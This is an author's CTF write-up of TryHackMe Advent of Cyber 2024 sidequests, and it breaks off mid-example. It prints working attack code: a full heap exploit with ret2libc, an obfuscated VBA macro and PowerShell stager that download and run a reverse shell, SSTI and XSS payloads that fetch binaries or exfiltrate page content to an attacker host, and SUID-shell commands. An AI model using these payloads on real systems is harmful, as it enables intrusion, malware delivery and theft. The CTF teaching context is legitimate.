# Advent of Cyber 2024 Sidequest

This was really fun this year, with some real *meaty* challenges. Some, especially SQ3, taught me a lot. I was teamed up with the other room testers on 'Team Awesome' - we were not privy to any of this challenges before hand so were allowed to compete. Overall, we came first in one challenge, but generally were second (there are some real skilled hackers out there in the community).

Each challenge first required finding a keycard in the main Advent of Cyber rooms. These keycards had a password that generally would be used to unlock the server(s) for the side quest via a page on 21337, except for the first challenge where the password was the key to a zip file.

## SQ1: Operation Tiny Frostbite

- Scoreboard: 1st
- Rated: Hard
- Released: Day 1

### Keycard

The main challenge was about a command and control setup, and involved finding git repos. In the github account there was the code for the C2 server, which leaked some information: that it was built with Flask, the secret key used for sessions, and the username. By scanning the server you could find the C2 instance on some high port. Then, using the leaked secret key and username you could forge a session key using a tool like [flask-unsign](https://github.com/Paradoxis/Flask-Unsign). Once you had access to the dashboard, the keycard was displayed multiple times in a table on the main page.

### Sidequest

The sidequest presented an evidence zip file, which the keycard's password would unlock. Inside was a pcap. Reviewing the captured traffic, several things could be seen:

- there was a scan, filling up most of the first half of the pcap
- a small amount of http traffic back and forth, where you can find the password for one of the earlier sidequest questions (this password can also be found via `strings pcap | grep password` as the http traffic is unencrypted)
- a few binaries are exchanged (use export objects)
- there is a bunch of encrypted traffic involving port 9001

If you are particularly astute, you will notice that a request to port 9002 returns a zip file. This zip file is the subject of questions 3 and 4 of the side quest, and the meat of the challenge (question 3) is finding the password for it.

The traffic to 9001 is the main focus. Its encrypted, but its exchanged in small back and forth blocks (if you 'follow the tcp stream' you cna see this. That looked like C2 traffic to me, with fits with the theme. The focus would then shift to the binaries transfered as that feels like getting a client for a c2 in place. If you exported these binaries, a good local AV would tell you they are malicious. Getting their hashes and checking against virus total would identify them, particularly the one named 'ff', as trojans. Getting raw strings and doing a web search, or poking around on the virustotal entry, would hopefuly get you to https://github.com/creaktive/tsh, which is the repo for this trojan.

The challenge is then to use this source code and the binary we have (which is important, as it has within it a baked secret key) to decode the port 9001 traffic. Within the repo is [pel.c](https://github.com/creaktive/tsh/blob/master/pel.c) which is the guts of the encryption: following this you can see the first step is two randomly generated IV values, that are sent from the client to the server. Each is 20 bytes long, sent in one 40 byte block, and in wireshark we can see the first message to the server is this length. As we can now recover these keys, we have all the pieces to write a script to decode the C2 traffic. My script is as follows:

```python
import hashlib
from Crypto.Cipher import AES

class PELContext:
    def __init__(self, secret_key: bytes, iv: bytes):
        if len(iv) != 20:
            raise ValueError("IV must be 20 bytes long.")
        
        sha1 = hashlib.sha1()
        sha1.update(secret_key)
        sha1.update(iv)
        buffer = sha1.digest()

        self.aes_key = buffer[:16]

        self.k_ipad = bytearray(64)
        self.k_opad = bytearray(64)

        for i in range(64):
            self.k_ipad[i] = 0x36
            self.k_opad[i] = 0x5C

        for i in range(len(buffer)):
            self.k_ipad[i] ^= buffer[i]
            self.k_opad[i] ^= buffer[i]

        self.last_ciphertext = iv[:16]
        self.packet_counter = 0

    def decrypt_message(self, packet: bytes):
        if len(packet) <= 20:
            raise ValueError("Packet is too short to contain ciphertext and HMAC.")
        
        ciphertext = packet[:-20]
        received_hmac = packet[-20:]

        counter_bytes = self.packet_counter.to_bytes(4, byteorder='big')
        ipad_digest = hashlib.sha1(self.k_ipad + ciphertext + counter_bytes).digest()
        hmac = hashlib.sha1(self.k_opad + ipad_digest).digest()

        if hmac != received_hmac:
            raise ValueError("HMAC verification failed.")

        aes_cipher = AES.new(self.aes_key, AES.MODE_CBC, self.last_ciphertext)
        plaintext = aes_cipher.decrypt(ciphertext)

        msg_len = (plaintext[0] << 8) + plaintext[1]
        message = plaintext[2:2 + msg_len]

        self.last_ciphertext = ciphertext[-16:]
        self.packet_counter += 1

        return message

def setup_context(secret_key: str, iv: bytes):
    context = PELContext(secret_key.encode('utf-8'), iv)
    return context

# Example usage
secret_key = "SuP3RSeCrEt"

ivs = bytes.fromhex(
    "26f321efd8ee637c408657b6fd94059e33191e953a41611cb0b4b3a0f889f679616120961d87f683"
)

# Split the initial IVs
iv_client = ivs[:20]
iv_server = ivs[20:]

client_context = setup_context(secret_key, iv_client)
server_context = setup_context(secret_key, iv_server)

def decrypt_client(message):
    decoded_client_message = client_context.decrypt_message(message)
    print("Decoded Client Message (bytes):", decoded_client_message)
    print("Decoded Client Message (hex):", decoded_client_message.hex())

def decrypt_server(message):
    decoded_server_response = server_context.decrypt_message(message)
    print("Decoded Server Response (bytes):", decoded_server_response)
    print("Decoded Server Response (hex):", decoded_server_response.hex())
```

note when passing messages to this, e.g. `decrypt_client(bytes.fromhex(message))` you need to pass them in order, as it maintains an internal counter. The order is specific to the 'side' of the conversation: e.g. you could just decrypt all the client messages, without worrying about the server responses. Also note that wireshark occasionally presents multiple messages concatted together: you will need to separate them or the decryption will fail. The flow is the user talks to the server, asks to setup a shell (the server responds with a few messages for this, the first that are concatted together) then sends some commands to extract the sql and create the zip file, with the password you need to recover.

## SQ2: Yin and Yang

- Scoreboard: 2nd (team)
- Rated: Hard
- Released: Day 5

### Keycard

The main challenge is exploiting XXE. With that XXE you can enumerate the system, and by reading apache config files you can find a hidden website URL with the keycard.

### Sidequest

This challenge was somewhat unconventional in that it involved two servers, Yin and Yang. Both needed to be started to solve the challenge. Additionally, SSH credentials were provided for both. On each [ROS](https://ros.org/) was setup, a framework for automating robots. The users we had access to could start a script as sudo, with the script connecting to a ROS master server on localhost and then sending messages meant to be picked up by the other machine.

The first challenge was getting the master server running, and reachable by both machines. On whichever machine you chose, it could be started with the command `roscore`. After that, the local user could start their script (e.g., if this is on yang, by running `sudo catkin_ws/yang.sh` which would connect their end of the communication. The other machine (here yin) would need to redirect localhost:11311 to the server running the master node; I did this with a ssh port forward, e.g. `ssh -L 11311:localhost:11311 yang@10.10.46.235`, however `/etc/hosts` was also writable on both machines which would have provided a simpler way to redirect localhost.

With machines communicating, you could examine the code their scripts were running and see what they were doing. Yin would message yang on a loop, yang would receive a message and send a message back. The messages they sent to each other would have an action the target should perform which, because both were running as root and this command was a straight os command, would give execution as root if we could control it. The complication was that the message from yin to yang was signed with a private key we couldn't read, and the message from yang to yin included a secret key we couldnt read.

The path forward was noticing that with yang, when it sent a message it included the private key as an extra parameter of the message. The messages to yin were not encrypted, and with the ros cli tool you could see the messages being sent (via `rostopic echo /messagebus` and so recover the key. With the key, and the following script run on yin, I could send a poisoned message to yang:

```python
`#!/usr/bin/python3

import rospy
import base64
import codecs
import os
from std_msgs.msg import String
from yin.msg import Comms
from yin.srv import yangrequest
import hashlib
from Cryptodome.Signature import PKCS1_v1_5
from Cryptodome.PublicKey import RSA
from Cryptodome.Hash import SHA256

class Yin:
    def __init__(self):

        self.messagebus = rospy.Publisher('messagebus', Comms, queue_size=50)


        #Read the message channel private key
        pwd = b'secret'
        with open('/home/yin/yin/privatekey.pem', 'rb') as f:
            data = f.read()
            self.priv_key = RSA.import_key(data,pwd)

        self.priv_key_str = self.priv_key.export_key().decode()

        rospy.init_node('yrdy')

        self.prompt_rate = rospy.Rate(0.5)

    def getBase64(self, message):
        hmac = base64.urlsafe_b64encode(message.timestamp.encode()).decode()
        hmac += "."
        hmac += base64.urlsafe_b64encode(message.sender.encode()).decode()
        hmac += "."
        hmac += base64.urlsafe_b64encode(message.receiver.encode()).decode()
        hmac += "."
        hmac += base64.urlsafe_b64encode(str(message.action).encode()).decode()
        hmac += "."
        hmac += base64.urlsafe_b64encode(str(message.actionparams).encode()).decode()
        hmac += "."
        hmac += base64.urlsafe_b64encode(message.feedback.encode()).decode()
        return hmac

    def getSHA(self, hmac):
        m = hashlib.sha256()
        m.update(hmac.encode())
        return str(m.hexdigest())

    #This function will craft the signature for the message based on the specific system being talked to
    def sign_message(self, message):
        hmac = self.getBase64(message)
        hmac = SHA256.new(hmac.encode('utf-8'))
        signature = PKCS1_v1_5.new(self.priv_key).sign(hmac)
        sig = base64.b64encode(signature).decode()
        message.hmac = sig
        return message

    def craft_ping(self, receiver):
        message = Comms()
        message.timestamp = str(rospy.get_time())
        message.sender = "Yin"
        message.receiver = receiver
        message.action = 1
        message.actionparams = ['cp /bin/sh /home/yang/sh && chmod u+s /home/yang/sh']
        #message.actionparams.append(self.priv_key_str)
        message.feedback = "ACTION"
        message.hmac = ""
        return message

    def send_pings(self):
        # Yang
        message = self.craft_ping("Yang")
        message = self.sign_message(message)
        self.messagebus.publish(message)

    def run_yin(self):
        # while not rospy.is_shutdown():
        self.send_pings()
        self.prompt_rate.sleep()

if __name__ == '__main__':
    try:
        yin = Yin()
        yin.run_yin()

    except rospy.ROSInterruptException:
        pass
```

This was largely just a customised version of the yin script that was already running. It would create on yang a suid-bit set version of sh, which could be used to escalate to root on that machine to recover both the yang flag and the secret key.

Once you had the secret key, you could use the ros cli to send a message to yin (from either machine) to do the same, creating a suid bit binary on that machine as well, e.g. with this command: `rosservice call /svc_yang "{'secret': '<recoveredsecret>', 'command': 'cp /bin/sh /home/yin/sh; chmod u+s /home/yin/sh
', 'sender': 'Yang', 'receiver': 'Yin'}"`

## SQ3: Escaping the Blizzard

- Scoreboard: 10th 
- Rated: Insane
- Released: Day 12

### Keycard

The main room was about race conditions in a banking site. When you made a transfer it would present a md5 hash as the transaction ID, which could be discovered to just be a hash of an integer ID. A bit of fuzzing would reveal a /transactions url on the site that would accept an ID query string parameter - iterating through integer IDs (submitting them MD5 hashed) would find a transaction that contianed a base64 string. This decoded string was a URL that presented the key card.

### Sidequest

This was the hardest and probably most satisfying challenge in the competition, for me. After you unlocked the side quest server, you would find a 1337 port displaying a simple interface, and a website. On the website you could find a backup folder with a zip file (that you can extract with a plain text attack), containing the binary secureStorage along with the libc and ld shared libraries it was using, the binary being what is running behind the 1337 port. So the challenge is binex: find a way to exploit the binary locally, then use your exploit against the remote endpoint to get a shell.

A quick decompile of the secureStorage binary will reveal this is a heap exploitation challenge: it has functionality to allocate up to 32 chunks via `malloc`, asking for a size each time of up to 0x1000 or 4096 bytes (for the allocation), and allowing you to write up to the size plus 0x10 or 16 bytes. The extra 0x10 bytes is the vulnerability: its a heap buffer overflow, though 16 bytes is not much.

However, on top of this being a heap challenge which I had never done before, its a *hard* heap challenge: there is no `free` calling in the binary, it runs with the latest or near latest version of glibc (2.39) and only had that small overflow: these three factors eliminate like 90% of possible heap exploits you will find online, including most of the 'House of X' famouse heap exploits. Particularly the lack of `free` means we can't free our allocated chunks, eliminating use after free, double free and other techniques. On top of all that, every protection is enabled (full relro, nx bit, pie etc).

At the same time, these restrictions would ultimately point towards the narrow path forward, via techniques known as House of Orange and its modern variant House of Tangerine. To understand them requires a bit of context:

- the heap is a section of memory allocated for your program's use. When you use `malloc` and provide it a size, it will return an address in this heap section. The next time you use malloc, it will return another address directly after (except for a two address gap) the previous space you requested.
- the space between the 'chunks', as they are called, is two addresses wide. the first is not used for 'live' chunks, but the second contains the allocated size as a simple number. this number also uses its lowest bits to track flags: 0x1 being the most important in this challenge as it specifies whether or not the previous chunk is 'live'. If not, if a chunk was freed and its previous was not in use, the two would be combined as empty space for recycling - this is not relevant for this challenge as we can't free chunks, but the flag is important anyway. As an example, if we asked for a 0x1000-sized chunk, the size value would be 0x1001, placed immediately before the address that malloc gives us.
- when space is freed, the pointer to it and size are tracked in 'bins'. These various bins are designed to allow efficient reuse of available memory, and come in different categories based on the size. E.g. the 0x400 size tcache bin will store free memory of 0x400 size (sort of, I think its actually 0x390). If the program later asks for memory 0x400 in size, the memory manager can just return the head pointer in that tcache bin quick and easy.

The goal we have is to get malloc to return an address to somewhere useful, preferably in the main program, the stack or in libc. I.e. all places. Once we get a useful address, the program will allow us to read and write to it which can provide multiple possibilities. But how?

Enter House of Orange as our first trick. House of Tangerine is the ultimate path of exploitation, but its just House of Orange with Tcache poisoning so by understanding House of Orange we are almost all the way there. The idea is that when you allocate a chunk, the way the memory manager keeps track of how much space is left in the entire heap is via a 'top chunk'. This is an unallocatable (normally) size value placed after the latest allocated chunk, tracking how much space is left in the heap. If the space diminishes enough and an allocation is asked for that is larger than the top chunk space, a new heap is requested from the OS to serve the request, with a new top chunk and everything. The old top chunk, which might still be useful, is placed into one of the bins exactly as if it was a normal chunk that had been freed.

With this trick, we can sort of free chunks without free. And with the overflow the program contains, we can overflow the size of the following chunk or, if need be, the size of the top chunk. With this we can trigger house of orange at will: overflow the top chunk's size with a small size, then request a larger chunk to force the top chunk into a bin. We can even do it multiple times as each time we force the top chunk into the bin, a new heap is allocated with a new top chunk that we can repeat the process with.

The exploit has two stages: first we put the top chunk into the unsorted bin, which is a bin for chunks that dont fit in any of the others. Chunks in the unsorted bin have two pointers placed in them, forward and back, as its a doubly linked list. Our overflow is not sufficient to override these. Additionally a heap address and a libc address are placed in the bin, which we can recover by allocating a small chunk that will be carved out of the unsorted bin head chunk. I am unsure why these addresses are in there, or what they are for, but by getting them out (reading them with a show command) we can get a libc and heap leak, and calculate the base address of these (otherwise unknown as everything is PIE).

The second stage is putting the top chunk into a specific tcache bin by carefully controlling its size. And then doing this again to put another chunk in the same bin. The tcache bins are singly-linked lists, with each chunk except the last containing a slightly obfuscated pointer to the next chunk in the list. When allocating, the memory manager returns the address of the head chunk in the bin, and then updating its head chunk address to the pointer that links the chunks. By putting our own chunks in there, we can override the linking pointer to wherever we wish. Then, after an allocation to remove the head, the next allocation will be at our target location.

My full exploit script is as follows, with plenty of explanatory comments; the basic process is:

- pop the top chunk into the unsorted bin, then read out a libc and heap leaked address
- pop the top chunk into the tcache bin, size 0x40
- pop another top chunk into the same bin. overwrite the pointer to target `__libc_argv`, a location in libc that will contain a pointer to the stack. with this we can calculate the location on the stack where the main functions return address is
- pop a new top chunk into a different tcache bin, size 0x400~
- pop another chunk into th same bin. overwrite the pointer to target our calculated stack location containing the main function return address
- write in a ret2libc payload over the main functions return address
- exit main to trigger our payload and get a shell.

```python
from pwn import *

binary = './secureStorage'
elf = ELF(binary)
libc = ELF('./libc.so.6')

p = remote('10.10.47.4', 1337)
# p = process(binary)

def create(index,size,data):
    p.sendlineafter(b'>>', b'1')
    p.sendlineafter(b'index:', str(index).encode())
    p.sendlineafter(b'size:', str(size).encode())
    p.sendafter(b'data:', data)

def edit(index,data):
    p.sendlineafter(b'>>', b'3')
    p.sendlineafter(b'index:', str(index).encode())
    p.sendafter(b'data:', data)

def show(index):
    p.sendlineafter(b'>>', b'2')
    p.sendlineafter(b'index:', str(index).encode())
    p.recvline();
    return p.recvline().strip()

# first need a libc and heap base leak

create(0, 256, 256*b"A" + p64(0) + p64(0xc61)) # create an overflow top chunk size, 'house of orange' style
create(1, 0xf98, b"firstlargechunk") # this will be used later, but here forces top chunk into unsorted bin

# original top is now in unsorted bins because its size is too big for tcache bins

# leak a libc address, by carving a portion from our unsorted bin 
# which has a libc address in it at 8: and which gets preserved in the new alloc

create(2, 24, b"LEAKADDD")
data = show(2)
data = u64(data[-6:].ljust(8,b'\x00'))
print('leaked libc: ' + hex(data))
libc_base = data - 0x204120 # calculated using vmmap and comparing libc base the above
print('libc\'s base: ' + hex(libc_base))
libc.address = libc_base

# do the same again, this time for a heap address at position 16:

edit(2, b"LEAKADDDLEAKADDD")
data = show(2)
data = u64(data[-6:].ljust(8,b'\x00'))
print('leaked heap: ' + hex(data))
heap_base = data - 0x3a0 # calculated using vmmap and comparing to the above
print('heap\'s base: ' + hex(heap_base))

# now need to return to our second alloc (first big one) to overflow the new top
# need to overflow the top size to 0x60 (61 with in use bit) so it goes into a specific tcache bin
# under 0x410 means tcache, not unsorted. this is the 'house of tangerine' attack

payload = b"A"*0xf98
payload += p64(0x61) # target bin we want to hit, here 0x40 + 0x20
edit(1, payload)
create(3, 0xf98, b"secondlargechunk")

# top chunk will now be in tcache 0x40 (this is the second top chunk, after the original we used for leaks)

payload = b"secondlargechunk"
payload += b"B"*(0xf98 - len(payload))
payload += p64(0x61)
edit(3, payload)
create(4, 0x1000, b"thirdlargechunk")

# new top chunk will be in tcache 0x40, linked to the first one

# need to calculate the corrupted tcache address (which is xor encoded with portions of its memory address)
# which will be our target; when we allocate off the tcache list, malloc will return this target address

vuln_tcache = heap_base + 0x43FB0 # this is the first address after the size of the first tcache chunk, overwritable with index 2
print("tcache address: " + hex(vuln_tcache))
target = libc.symbols["__libc_argv"] - 0x10 # this contains an address on the stack, which can leak to use for further targeting. go back 0x10 so as not to wipe the data we want to read
print("target address: " + hex(target))
safe_link_addr = target ^ (vuln_tcache >> 12) # not-so-safe linking protection bypass

payload = b"A"*0xf98
payload += p64(0x41) # note once the bins are in the tcache, they are 0x20 smaller than they were before
payload += p64(safe_link_addr)
edit(3, payload)

# allocate out of the tcache bin, corruptng it
create(5, 0x30, b"removefirsttcache")
create(6, 0x30, b"controllocation!") # this 'permit' will be allocated at the address we specified above

data = show(6)
data = u64(data[-6:].ljust(8,b'\x00'))
print('leaked stack: ' + hex(data))
predicted_main_ret = data - 0x120
print('main ret: ' + hex(predicted_main_ret))

create(7, 0xc10, b"fourthlargechunk") # just to clean out the unsorted bin - this is the size of the bin - 0x10, and results in the bin being fully allocated back on the heap
# we do this because its size is bigger than the tcache bins we want to create next, which will likely mean any allocations would have gotten carved out of this bin instead

# first of the new tcache bins - still in the heap at this point
create(8, 0xbc8, b"fifthlargechunk")
payload = b"fifthlargechunk"
payload += b"C"*(0xbc8 - len(payload))
payload += p64(0x421) # size of the bin we are targeting, 0x400 + 0x20
edit(8, payload)

# second new bin, and also it pushes the previous into the tcache
create(9, 0xbd8, b"sixthlargechunk")
payload = b"sixthlargechunk"
payload += b"D"*(0xbd8 - len(payload))
payload += p64(0x421)
edit(9, payload)

# this will push the second bin into the tcache bin 0x400, with the two linked
create(10, 0x1000, b"seventhlargechunk")
  
# targeting for our second arbitrary allow - the offset is calculated by the head of the tcache bin - heap base
vuln_tcache = heap_base + 0x87BF0
print("new vuln tcache: " + hex(vuln_tcache))
target = predicted_main_ret - 0x8
print("target: " + hex(target))
safe_link_addr = target ^ (vuln_tcache >> 12)

# load in the target
payload = b"sixthlargechunk"
payload += b"D"*(0xbd8 - len(payload))
payload += p64(0x401) # 0x20 smaller than 0x420
payload += p64(safe_link_addr)
edit(9, payload)

# allocate out of the tcache bin, corrupting it
create(11, 0x3f0, b"removefirsttcache") # 0x10 (16 bytes) smaller than the tcache bin.
# this will be at our target location

# basic ret2libc payload

ret = p64(libc_base + 0x1afc8c) # objdump -d libc.so.6 | grep ret
poprdiret = p64(libc_base + 0x10f75b) # ROPgadget --binary libc.so.6 | grep 'pop rdi'
system = p64(libc.symbols["system"])
binsh = p64(libc_base + 0x1cb42f) # strings -a -t x libc.so.6 | grep /bin/sh
final_payload = p64(0) + ret + poprdiret + binsh + system + p64(0)

create(12, 0x3f0, final_payload)

# attach(p)

p.sendlineafter(b'>>', b'4') # exit main to trigger exploit

p.interactive()

```

After this we land in a docker container with root access. The container escape was via core_pattern, which is relatively easy - description of the approach here: https://pwning.systems/posts/escaping-containers-for-fun/

## SQ4: Krampus Festival

- Scoreboard: 2nd (team)
- Rated: Insane
- Released: Day 17

### Keycard

A scan of the box revealed a second website with a login form. The form is vulnerable to sql injection so you can bypass it, landing on a cctv management page. The feeds for the cameras return nothing, but are also vulnerable to sql injection in the query string, so you can recover the database. This will reveal the name of a recording not shown on the main site (containing 1337) which you can watch to get the keycard.

### Sidequest

This was a phishing and AD exploitation challenge, a bit tricky. The foothold was particularly painful: after unlocking the side quest machine you can scan and see a bunch of windows ports, indicating its a domain controller (but no port 88). There is a share that contains the first flag and a excel document called approved.xlsx. The excel document contains a list of apparent passwords, and was from administrator@socmas.corp to developer@test.corp. The path in is using developer and one of those passwords to authenticate with an imap/smtp server also exposed on the box. This took me a long time and a lot of wasted effort because I discarded that developer email out of hand.

Anyway, once you have access to the imap server, you will see some emails requesting a document with credentials. It specifies that the document should be `.docx`, but `.docm` works as well which is important since you can't put macros in a docx file. The macro I used to get a reverse shell was the following:

```vba
Function Pre()
    Pre = Array(4, 7, 30, 22, 27, 0, 9, 17, 9, 31, 84, 69, 0, 20, 9, 12, 87, 13, 11, 28, 5, 7, 27, 73, 94, 7, 28, 17, 84, 72, 4, 84, 0, 12, 8, 8, 10, 25, 79, 95, 15, 68, 29, 13, 17, 91, 65, 29, 4, 3, 72, 28, 22, 2, 0, 15, 24, 79, 4, 22, 1, 24, 1, 25, 70, 7, 22, 29, 93, 22, 17, 7, 16, 24, 1, 0, 2, 24, 70, 89, 11, 29, 27, 10, 24, 7, 8, 23, 26, 7, 19, 29, 11, 20, 92, 79, 13, 24, 24, 31, 77, 64, 93)
End Function
Function Post2()
    Post2 = Array(83, 65, 64)
End Function
Function Source()
    Source = Array(3, 1, 7, 30, 14, 30, 21, 7, 95)
End Function
Function Dest()
    Dest = Array(35, 1, 7, 64, 91, 44, 49, 6, 10, 16, 17, 27, 22)
End Function
Function Key()
    Key = "thisisatesthelloworld"
End Function
Function Comb(parts)
    For i = LBound(parts) To UBound(parts) - 1:
        Comb = Comb + Trim(parts(i) + ".")
    Next
    Comb = Comb + Trim(parts(UBound(parts)))
End Function
Function Eval(equation)
    k = Key()
    For i = LBound(equation) To UBound(equation)
        j = i Mod Len(k) + 1
        kv = Asc(Mid(k, j, 1))
        res2 = res2 + Chr(equation(i) Xor kv)
    Next
    Eval = res2
End Function
Sub Test()

a = 266
b = 266
c = 239
d = 243
dd = 4444
E = "run"
f = "txt"

r = Array(Str(a - 256), Str(b - 256), Str(c), Str(d))
f = Comb(r) + ":" + Trim(Str(dd)) + "/" + Comb(Array(E, f))

s = Trim(Eval(Pre())) + f + Eval(Post())
i = Eval(Source())
j = Eval(Dest())
GetObject(i).Get(j).Create s, Null, Null, -1
'MsgBox (s)

End Sub
Sub AutoOpen()
    Test
End Sub
```

It looks a bit complicated but it isn't really: the long arrays of numbers are just strings XORd with that key, `thisisatesthelloworld`, and all they do is download a file from a remote server (run.txt) and then pass it to powershell for execution. The remote server is specified by IP, with the first two octets incremented by 256 (so in the above the target is 10.10.239.243:4444/run.txt). In the run.txt file I hosted on the server, I put the following powershell:

```powershell
$url = "http://10.10.239.243:4444/malicious.exe"
$filePath = "$env:temp\downloaded.exe"
Invoke-WebRequest -Uri $url -OutFile $filePath
if (Test-Path $filePath) {
    Start-Process -FilePath $filePath -NoNewWindow
} else {
    Write-Host "Download failed. File not found at $filePath"
}
```

Because the target machine is fully patched and running up to date defender, the revshell needs to bypass this. One coded in golang does the trick, getting a shell as the user `scrawler`.

From here, a bit of enumeration will show scrawler's password is saved in the winlogon registry keys. With that, given scrawler is a domain user, the domain can be enumerated in one of various ways (setting up a socks proxy or similar can allow you to use tools like ldapdomaindump, otherwise difficult given the server is not exposing all the ldap ports). You can find that one of the users in the domain has their password specified in the account description. If you use this password and check it against hashes for other users (e.g. via a GetUserSPNS enumeration) you will find that the same password is used for the user `Krampus_Debugger`.

From here bloodhound can help show the path: Krampus_Debugger has GenericWrite over Krampus_Shadow, who is a member of the KrampusIIS group, that has full write over the local webserver (which is running a ASP.NET RazorPages website). GenericWrite can allow you to set an SPN or disable pre-auth, getting the hash for Krampus_Shadow, but the hash is seemingly uncrackable. Instead, and somewhat suggested by the account name, you can use a shadow credentials attack, e.g. https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/shadow-credentials. With [pywhisker](https://github.com/ShutdownRepo/pywhisker) this can get you a winrm hash for Shadow (who is part of remote management, and so you can get a shell via evil-winrm or similar). Then you can modify the view pages of the website to give you a webshell/revshell as the IIS AppPool user. Since that user must always have SeImpersonate privileges, you can then use something like [EfsPotato](https://github.com/zcgonvh/EfsPotato) to get system.

Fun challenge, though the foot hold was a bit iffy.

## SQ5: An Avalanche of Web Apps

- Scoreboard: 2nd (team)
- Rated: Insane
- Released: Day 19

### Keycard

The main challenge involved exploiting a game. Given you have access to the server, you can grab the game binary and (via `ldd`) find its shared libraries, specifically `libaocgame.so`. If you get these off the machine (e.g. with a python webserver) and open them in ghidra or similar, you will find libaocgame has a getkeycard function that, when provided with the input argument "one_two_three_four_five" will create a zipfile with the keycard. The zip file is encrypted, but there is a password in the main game (recoverable via playing or via strings) that will unlock it to get the keycard. I used the following c program to call the getkeycard function (whose exported name could be recovered with `nm -D libaocgame.so`), though there is a way to invoke it through playing the game also I think:

```c
#include <stdio.h>
#include <dlfcn.h>
#include <stdint.h>

typedef uint64_t (*createKeycard_t)(char *);

int main()
{
    const char *library_path = "./libaocgame.so";

    void *handle = dlopen(library_path, RTLD_LAZY);
    if (!handle)
    {
        fprintf(stderr, "Error loading library: %s\n", dlerror());
        return 1;
    }

    dlerror();

    createKeycard_t createKeycard = (createKeycard_t)dlsym(handle, "_Z14create_keycardPKc");
    const char *error = dlerror();
    if (error != NULL)
    {
        fprintf(stderr, "Error loading function: %s\n", error);
        dlclose(handle);
        return 1;
    }

    char input[] = "one_two_three_four_five";
    uint64_t result = createKeycard(input);
    printf("create_keycard returned: 0x%lx (%lu)\n", result, result);
    dlclose(handle);

    return 0;
}
```

### Sidequest


After unlocking the server ports 80, 3000 and 53 are open (as well as 22). If you go to 80 or 3000 with a browser it redirects to '<http://thehub.bestfestivalcompany.thm/>', which is just a holding page. To find other possible domains, you can attempt a domain transfer against the open DNS port: `dig axfr @10.10.230.28 bestfestivalcompany.thm`. This will reveal `adm-int`, `npm-registry`, `thehub-int` and `thehub-uat` subdomains; thehub-uat is available on port 3000, while npm-registry can be accessed on port 80 where you will see it is running [Verdaccio](https://verdaccio.org/).

#### foothold via ssti

To get a foothold, you can exploit stored XSS and SSTI on the uat site: there is a contact form where you can submit a message that gets viewed once a minute. By using a payload like: `<script src="attackbox/script.js"></script>` and then hosting a script js on your attack box, you can use the XSS to enumerate the machine. E.g. putting something like `fetch('attackbox?x=' + btoa(document.body.outerHTML))` or similar you can exfiltrate the page content the admin is looking at. Cookies can't be extracted, but with a little enumeration you can find a wiki path that is vulnerable to SSTI. This is actually telegraphed in the npm-registry: if you carefully go through the packages hosted, you will find one [created by McSkidy](http://npm-registry.bestfestivalcompany.thm/-/web/detail/markdown-converter) that can be downloaded and examined, showing the SSTI vulnerability. A payload like the following will give remote code execution (here used to download a revshell payload from my attack box and run it):

```javascript
const formData = new URLSearchParams({
  title: "My New Wiki",
  markdownContent: `{{ ''.constructor.constructor('require("child_process").exec("wget 10.10.174.209:4444/c -O /tmp/c && chmod 777 /tmp/c && /tmp/c")')() }}`
});

fetch('/wiki', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded',
  },
  body: formData.toString(),
})
```

this will get a shell as root inside a container. 

#### enumeration and git

Enumeration from here can be tricky, as the box is quite tightly locked down, but a few facts are discovered:

- on this container there are three websites under /app: thehub-uat (with the contact form), thehub-int (with the wiki) and the under construction site.
- the machine's IP address is 172.16.1.3. There is a port 3000, 4873 and 5000 listening on 172.16.1.2 (4873 is the verdaccio site) and there is 22 on 172.16.1.1
- by examining the source code of /app/bfc_thehubuat and both ps aux and netstat -tulpn, you can see the various hosting arrangements.
- there is an assets folder that contains within it a git repo: `/app/bfc_thehubuat/assets/.git`. this assets folder is exposed at `:3000/`

by reading the git config file, some interesting information can be gathered:

```
01ab15a97254:/app/bfc_thehubuat/assets/.git# cat config
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
        ignorecase = true
        precomposeunicode = true
[remote "origin"]
        url = git@10.10.208.125:bfcthehubuat
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
        remote = origin
        merge = refs/heads/main
[user]
        name = bfc_admin
        email = bfc_admin@bestfestivalcompany.thm
```

 There is no git binary on the box, but you can exfiltrate the repo (e.g. by taring it - thehub-uat serves the assets folder at / for reasons that will become important later) and explore on the attack box or wherever; in the history you can find an ssh key called `backup.key` under /assets/backup.

 With further enumeration you can find an open 22 on 172.16.1.1. By using the key extracted from the repo, and running a command like `ssh -i backup.key git@172.16.1.1`, you can see you have readonly access to five repositories:

 ```
 01ab15a97254:~# ssh -i backup.key git@172.16.1.1
PTY allocation request failed on channel 0
hello backup, this is git@tryhackme-2404 running gitolite3 3.6.12-1 (Debian) on git 2.43.0

 R      admdev
 R      admint
 R      bfcthehubint
 R      bfcthehubuat
 R      underconstruction
Connection to 172.16.1.1 closed.
```

At this point I set up a proxy to the docker machine so I could use git from my attack box. I set the ssh command for git to use the backup key: `export GIT_SSH_COMMAND='ssh -i backup.key -o IdentitiesOnly=yes'` and could then checkout repos with `proxychains git clone git@172.16.1.1:admint` - forwarding port 22 with chisel could work as well, or copying over a static git binary to the compromised machine maybe. I was using [reverse_ssh](https://github.com/NHAS/reverse_ssh) as my rev shell though, so was able to set up a standard ssh socks proxy on port 9050 and then use proxychains.

Of the repos available, admdev contains nothing interesting and the other three aside from `admint` we already have access to. `admint` though is interesting - by examining its index.js you can find a few facts:

- its hosted on port 3000, containing several POST endpoints. by running `curl -X POST 172.16.1.2:3000/restart-service`, you can confirm this site is on 172.16.1.2 (it'll respond unauthorized)
- the authentication downloads a jwks file from thehub-uat, and uses it to validate a supplied jwt. as we control the host that thehub-uat is on, we can bypass this check with a custom jwks file (the file is in the assets folder)
- the three services admint provides seem to allow restarting a service, changing the resolve.conf file, and forcing a npm module update.

The path forward seems to be a hijack of npm modules, by first using the resolve endpoint to change where the 'npm-registry' domain is resolved to and then forcing an update. this is multi stage so each is in its own section below

#### authentication with admint

Using <https://mkjwk.org/> you can generate a new jwks file and key - specify rsa, 2048, signature, rs256-*, timestamp, show x509 = true and generate. The public key window contains the new jwks. With <https://jwt.io/> you can then create a jwt: set the algorithm to RS256, copy in the public and private keys, and set the content to `{"username":"mcskidy-adm"}`. Replace the jwks file with the public key content from mkjwk (the file that contains kty, n and e, not the new ssh key in x509 format); note it needs to be wrapped with `{ "keys": [ mkjwk public key ]}`, e.g.:

```json
{"keys": [  {
    "kty": "RSA",
